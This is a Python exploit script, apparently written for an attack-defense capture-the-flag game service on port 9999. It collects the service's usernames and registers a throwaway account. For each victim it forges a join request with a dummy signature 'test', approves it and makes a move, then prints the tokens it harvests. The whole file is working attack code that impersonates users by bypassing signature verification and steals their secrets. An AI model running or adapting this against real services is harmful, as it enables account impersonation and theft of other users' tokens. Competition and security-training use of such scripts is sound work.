import re
import sys
import time
import json
import base64
import random
import string

from requests import Session

ip = sys.argv[1]
port = 9999

url = f'http://{ip}:{port}'

s = Session()

username = ''
keys = {}
token = ''

def generate_str(length=None):
    """Generate a random string of fixed length."""
    if not length:
        length = random.randint(10, 20)
    letters = string.ascii_letters + string.digits
    return ''.join(random.choice(letters) for _ in range(length))

def generate_nonce():
    nonce = random.randint(0, 2 ** 32-1)
    return nonce


def create_game_action(grid_size: int, username: str, creator_first: bool):
    type_ = 1
    create_game_data = {'grid_size': grid_size, 'creator': username, 'creator_first': creator_first, 'nonce': generate_nonce()}
    return {'type': type_, 'create_game': create_game_data}

def make_move_action(X: int, Y: int, player: int, game_id=None):
    type_ = 2
    make_move_data = {'game_id': game_id, 'move': {'X': X, 'Y': Y}, 'player': player, 'nonce': generate_nonce()}
    return {'type': type_, 'make_move': make_move_data}

def join_game_action(username, game_id):
    type_ = 3
    join_game_data = {'player': username, 'game_id': game_id, 'nonce': generate_nonce()}
    return {'type': type_, 'join_game': join_game_data}

def approve_join_action(join_request):
    type_ = 4
    approve_join_data = {'request': join_request, 'nonce': generate_nonce()}
    return {'type': type_, 'approve_join': approve_join_data}


# API

def create_game(game_data, move_data, signatures):
    data = {'game_data': game_data, 'signatures': signatures}
    if move_data != {}:
        data['move_data'] = move_data
    answer = s.post(f'{url}/api/games/create', json=data)
    return answer

def make_move(move_data, signature):
    data = {'move_data': move_data, 'signature': signature}
    answer = s.post(f'{url}/api/games/move', json=data)
    return answer

def approve_join(approve_data, signature):
    data = {'approve_data': approve_data, 'signature': signature}
    answer = s.post(f'{url}/api/games/approve', json=data)
    return answer

def sign_actions(actions, privkey):
    data = {'actions': actions, 'privkey': privkey}
    answer = s.post(f'{url}/api/games/sign', json=data)
    return answer

def register(username: str, pubkey: str, token: str):
    data = {'username': username, 'pubkey': pubkey, 'token': token}
    answer = s.post(f'{url}/api/user/register', json=data)
    return answer

def gen_keys():
    answer = s.get(f'{url}/api/user/genkeys')
    return answer

def get_auth_token(username, privkey):
    data = {'username': username, 'privkey': privkey}
    answer = s.post(f'{url}/api/user/token', json=data)
    return answer

def get_games():
    headers = {"Authorization": token}
    answer = s.get(f'{url}/api/games/getall', headers=headers)
    return answer

def get_tokens():
    headers = {"Authorization": token}
    answer = s.get(f'{url}/api/tokens/getall', headers=headers)
    return answer

# ------

def get_usernames():
    games = s.get(f'{url}/api/games/list').json()['games']
    usernames = [game['game_data']['creator'] for game in games]
    return usernames

def new_user_authtoken():
    global keys
    global username
    global token
    keys = gen_keys().json()
    username = generate_str()
    token = generate_str()
    register(username, keys['pubkey'], token).json()
    token = get_auth_token(username, keys['privkey']).json()['token']

usernames = get_usernames()
new_user_authtoken()

for victim in usernames:
    try:
        create_game_a = create_game_action(1, username, False)
        sigs = sign_actions([create_game_a], keys['privkey']).json()['signatures']
        create_game(create_game_a['create_game'], {}, sigs).json()

        gameid = get_games().json()['game_ids'][0]

        join_game_a = join_game_action(victim, gameid)
        join_game_data = join_game_a['join_game']
        sig = 'test'
        join_game_req = {'join_data': join_game_data, 'signature': sig}
        approve_join_a = approve_join_action(join_game_req)
        sigs = sign_actions([approve_join_a], keys['privkey']).json()['signatures']

        approve_join(approve_join_a['approve_join'], sigs[0]).json()

        make_move_a = make_move_action(0, 0, 1, gameid)
        sigs = sign_actions([make_move_a], keys['privkey']).json()['signatures']
        make_move(make_move_a['make_move'], sigs[0]).json()
    except Exception as e:
        continue

tokens = [token['Token'] for token in get_tokens().json()['tokens']]
for token in tokens:
    print(token)